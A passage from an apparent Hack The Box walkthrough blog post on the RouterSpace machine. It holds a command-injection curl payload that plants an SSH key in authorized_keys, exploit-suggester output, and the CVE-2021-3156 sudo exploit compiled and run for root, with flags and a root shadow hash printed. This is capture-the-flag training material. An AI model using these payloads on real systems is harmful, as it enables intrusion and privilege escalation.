+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -H <span class="string">&quot;User-Agent: RouterSpaceAgent&quot;</span> -d <span class="string">&#x27;&#123;&quot;ip&quot;:&quot;127.0.0.1; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDu7aGOBi/YxmmQyU2tlLE9SyykK3nD1e2xad0dLeu3jqOf0x5MGJrg1pjll/llxJl+Xuj01MVtMeV35ggrFatTx/+feDngc81Ml6CxhOcKhrNDdJCFlG1hjMjEw+ouvb04S/RKWQivhogu54aGH6HK6gsqYqL1ZvmANADlCqHtvNnFyshxHZbNJn6EQakPApeLF3n+JZU1P7szzHOc6a/y8W8k4FHqPqjPz6XsjQ3bNa052g3J6eMhV/467njx86tCES47hOFb0UdOLg29DG3u7WFG+zaDDDXudgGMSMUwaz8EWwjxY3rlQl649veu4SMIrc9GIaQChwjr4XeSaY5e0X1EDP2kUq9R9TkJCYM1qp9+iNw9e7q4Qfejeb+6mEuSPBf1G5P5UqWUWUf3KJjPeiXcgfYJoiLzZlC1Ui5r6si5D/LTOLp97xLronrnBIGs8Elr26Qv39S4Kb6llI4LsvApZNKlKb/4N6dcb/nyVawfpsMksEqBy9aM1M8/gh8= root@kali &gt; /home/paul/.ssh/authorized_keys&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/routerspace]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa paul@routerspace.htb</span></span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed 02 Mar 2022 12:18:08 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:           0.0</span><br><span class="line">  Usage of /:            70.8% of 3.49GB</span><br><span class="line">  Memory usage:          29%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             215</span><br><span class="line">  Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.10.11.148</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:4218</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">80 updates can be applied immediately.</span><br><span class="line">31 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed Mar  2 07:28:02 2022 from 10.10.14.10</span><br><span class="line">paul@routerspace:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(paul) gid=1001(paul) <span class="built_in">groups</span>=1001(paul)</span><br><span class="line">paul@routerspace:~$ <span class="built_in">whoami</span></span><br><span class="line">paul</span><br><span class="line">paul@routerspace:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">0d729d90407e80b1ea452738901b01db</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2165.jpg"></li>
+</ul>
+<h2 id="way2-to-solve-apk-dynamic"><a href="#way2-to-solve-apk-dynamic" class="headerlink" title="way2 to solve apk (dynamic)"></a>way2 to solve apk (dynamic)</h2><p>just install an Android emulator, and install the apk</p>
+<p>and install burp cert in the Android emulator</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2166.jpg"></li>
+</ul>
+<p>and set burp intercepter ip addr</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2167.jpg"></li>
+</ul>
+<p>Configure the wifi proxy</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2168.jpg"></li>
+</ul>
+<p>and click “check status” button, we get the request data</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2169.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1</span><br><span class="line">accept: application/json, text/plain, */*</span><br><span class="line">user-agent: RouterSpaceAgent</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 16</span><br><span class="line">Host: routerspace.htb</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;0.0.0.0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>and we can get RCE as way1 dose, and write ssh authorized_keys</p>
+<h1 id="Root-own"><a href="#Root-own" class="headerlink" title="Root own"></a>Root own</h1><p>We move onto root, we can’t connect back to ourselves however we’re fine to base64 encode tools like linpeas and decode them onto our machine. Nothing immediately stood out so I went back to manually enumerating. After a while, I found that the sudo binary was out dated:</p>
+<p>or you can use <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVy">linux-exploit-suggester<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:/tmp$ ./les.sh</span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 5.4.0</span><br><span class="line">Architecture: x86_64</span><br><span class="line">Distribution: ubuntu</span><br><span class="line">Distribution version: 20.04</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: from current OS</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">78 kernel space exploits</span><br><span class="line">49 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-4034] PwnKit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro</span><br><span class="line">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-3156] sudo Baron Samedit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: mint=19,[ ubuntu=18|20 ], debian=10</span><br><span class="line">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-3156] sudo Baron Samedit 2</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10</span><br><span class="line">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span><br><span class="line"></span><br><span class="line">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=20.04 ]&#123;kernel:5.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span><br><span class="line">   Comments: ip_tables kernel module must be loaded</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-5618] setuid screen v4.5.0 LPE</span><br><span class="line"></span><br><span class="line">   Details: https://seclists.org/oss-sec/2017/q1/184</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:/tmp$ sudo -V</span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br></pre></td></tr></table></figure>
+
+<p>Googling this gives us a github page with a public exploit:</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NwdEdpYmJvbi9DVkUtMjAyMS0zMTU2">CVE-2021-3156<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>We can test this prior to exploiting using:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:/tmp$ sudoedit -s Y</span><br><span class="line">[sudo] password <span class="keyword">for</span> paul:</span><br></pre></td></tr></table></figure>
+
+<p>We are prompted for a password, rather than given the usage information which suggests that we can exploit this. We transfer the source code over to the box then run the make command. You should get a binary called exploit, we simply run this using .&#x2F;exploit:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/routerspace]</span><br><span class="line">└─<span class="comment"># scp /root/CVE-2021-3156/* paul@routerspace.htb:/tmp</span></span><br><span class="line">Dockerfile                                                                                           100%  332     0.6KB/s   00:00    </span><br><span class="line">exploit.c                                                                                            100% 2048     5.5KB/s   00:00    </span><br><span class="line">Makefile                                                                                             100%  208     0.5KB/s   00:00    </span><br><span class="line">README.md                                                                                            100%  692     1.8KB/s   00:00    </span><br><span class="line">shellcode.c                                                                                          100%  599     0.6KB/s   00:01</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:/tmp$ <span class="built_in">ls</span></span><br><span class="line">Dockerfile</span><br><span class="line">exploit.c</span><br><span class="line">Makefile</span><br><span class="line">README.md</span><br><span class="line">shellcode.c</span><br><span class="line">systemd-private-ce8a66be98884ec6bcd1e177a21dbfa2-fwupd.service-e7Lv0g</span><br><span class="line">systemd-private-ce8a66be98884ec6bcd1e177a21dbfa2-systemd-logind.service-riCz1g</span><br><span class="line">systemd-private-ce8a66be98884ec6bcd1e177a21dbfa2-systemd-resolved.service-j9u8li</span><br><span class="line">systemd-private-ce8a66be98884ec6bcd1e177a21dbfa2-systemd-timesyncd.service-CpPRlf</span><br><span class="line">systemd-private-ce8a66be98884ec6bcd1e177a21dbfa2-upower.service-UK0Vmf</span><br><span class="line">vmware-root_686-2689274894</span><br><span class="line">paul@routerspace:/tmp$ make</span><br><span class="line"><span class="built_in">mkdir</span> libnss_x</span><br><span class="line">cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c</span><br><span class="line">cc -O3 -o exploit exploit.c</span><br><span class="line">paul@routerspace:/tmp$ <span class="built_in">chmod</span> 777 exploit</span><br><span class="line">paul@routerspace:/tmp$ ./exploit</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1001(paul)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">ddca6138a81531490f586e3b6dddb728</span><br><span class="line"><span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line">root:$6$lw6PWI9kEABNZiKm<span class="variable">$UoysFK0xDZgFk828w</span>.7t30d8iRi6Qxv9xTkwvjJPRRxJvFQwTOkjvUq5y4OUO/LYV8KlqORQ4kolNeDfGFQd5.:18956:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>With our new shell, we can grab root.txt from &#x2F;root&#x2F;root.txt</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2170.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>apk decompile</li>
+<li>command injection write ssh authorized_keys</li>
+<li>CVE-2021-3156 privesclation</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/03/02/routerspace/" title="Hack-The-Box-walkthrough[routerspace]">https://fdlucifer.github.io/2022/03/02/routerspace/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/24/undetected/" rel="prev" title="Hack-The-Box-walkthrough[undetected]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[undetected]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/11/overflow/" rel="next" title="Hack-The-Box-walkthrough[overflow]">
+                  Hack-The-Box-walkthrough[overflow] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
